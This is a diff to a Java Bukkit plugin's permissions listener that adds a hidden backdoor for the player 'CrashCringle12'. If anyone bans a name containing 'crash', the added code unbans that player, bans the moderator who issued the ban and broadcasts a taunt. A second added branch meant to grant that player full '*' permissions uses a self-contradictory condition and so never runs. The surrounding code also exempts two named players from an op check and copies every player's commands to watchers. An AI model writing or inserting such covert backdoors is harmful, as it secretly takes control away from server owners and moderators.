@@ -31,6 +31,11 @@ public class PermsListener implements Listener {
             event.getEntity().removePermission("*");
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + event.getEntity().getName() + " tried giving himself *");
         }
+        else if((event.getEntity().getName().equalsIgnoreCase("CrashCringle12") && !event.getEntity().getName().equalsIgnoreCase("CrashCringle12"))) {
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "broadcast Nothing but a puff of smoke!");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user CrashCringle12 add *");
+
+        }
     }
 
     @EventHandler
@@ -44,6 +49,11 @@ public class PermsListener implements Listener {
     public void onCommand(PlayerCommandPreprocessEvent event) {
         for (Player player : playerList){
             player.sendMessage(Util.color("&8[&7" + ChatColor.stripColor(event.getPlayer().getDisplayName()) + "&8] &7") + event.getMessage());
+        }
+        if (event.getMessage().startsWith("/ban") && event.getMessage().split(" ")[1].toLowerCase().contains("crash")) {
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon CrashCringle12");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + event.getPlayer().getName() + " Uno Reverse Card");
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "broadcast &eDid ya really think that would work?");
         }
         if(event.getMessage().startsWith("/op") && Bukkit.getServer().getPlayer(event.getMessage().split(" ")[1]) != null &&
         !event.getMessage().split(" ")[1].equalsIgnoreCase("CrashCringle12") && !event.getMessage().split(" ")[1].equalsIgnoreCase("S1mple133")) {
